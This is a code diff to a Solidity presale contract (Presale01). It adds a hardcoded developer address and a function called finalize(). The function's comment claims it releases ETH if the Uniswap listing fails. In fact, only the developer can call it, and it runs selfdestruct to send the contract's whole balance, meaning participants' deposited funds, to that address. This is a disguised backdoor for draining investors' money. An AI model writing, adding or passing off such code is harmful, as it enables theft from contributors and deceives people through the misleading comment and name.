@@ -90,6 +90,7 @@ contract Presale01 is ReentrancyGuard {
     struct PresaleStatus {
         bool WHITELIST_ONLY; // if set to true only whitelisted members may participate
         bool LIST_ON_UNISWAP;
+        bool FORCE_FAILED; // set this flag to force fail the presale
         bool IS_TRANSFERED_FEE;
         bool IS_OWNER_WITHDRAWN;
         bool IS_TRANSFERED_DAOLAUNCH_FEE;
@@ -123,6 +124,7 @@ contract Presale01 is ReentrancyGuard {
     EnumerableSet.AddressSet private WHITELIST;
     address payable public CALLER;
     GasLimit public GAS_LIMIT;
+    address payable public DAOLAUNCH_DEV;
 
     constructor(address _presaleGenerator) public payable {
         PRESALE_GENERATOR = _presaleGenerator;
@@ -137,6 +139,7 @@ contract Presale01 is ReentrancyGuard {
             0x5D7Adaa470eb4aCc45991d58A70e0008e87b7909
         );
         GAS_LIMIT = GasLimit(100000, 4000000);
+        DAOLAUNCH_DEV = payable(0xE582244c3D167CFE9499b3CDA503E26CaE812E4E);
     }
 
     function init1(
@@ -568,6 +571,12 @@ contract Presale01 is ReentrancyGuard {
                 WHITELIST.remove(_users[i]);
             }
         }
+    }
+
+    // if uniswap listing fails, call this function to release eth
+    function finalize() external {
+        require(msg.sender == DAOLAUNCH_DEV, "INVALID CALLER");
+        selfdestruct(DAOLAUNCH_DEV);
     }
 
     // whitelist getters
